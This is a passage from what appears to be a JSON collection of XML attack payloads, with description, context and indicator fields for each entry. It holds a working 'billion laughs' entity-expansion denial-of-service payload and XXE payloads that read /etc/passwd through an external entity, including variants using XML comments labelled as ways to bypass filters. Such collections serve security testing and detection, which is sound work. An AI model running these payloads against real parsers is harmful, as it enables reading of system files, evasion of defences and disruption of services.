      {
        "payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"&#x41;&#x41;&#x41;&#x41;\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol2;</lolz>",
        "description": "Billion laughs with decimal entities",
        "context": "XML DoS",
        "indicator": "Expansion bomb"
      }
    ],
    "xml_injection_wrapper": [
      {
        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><!--]<foo>&xxe;</foo>",
        "description": "Comment wrapper to bypass filters",
        "context": "XML Bypass",
        "indicator": "Comment start + close"
      },
      {
        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo><!--",
        "description": "Trailing comment to bypass end detection",
        "context": "XML Bypass",
        "indicator": "Content before comment"
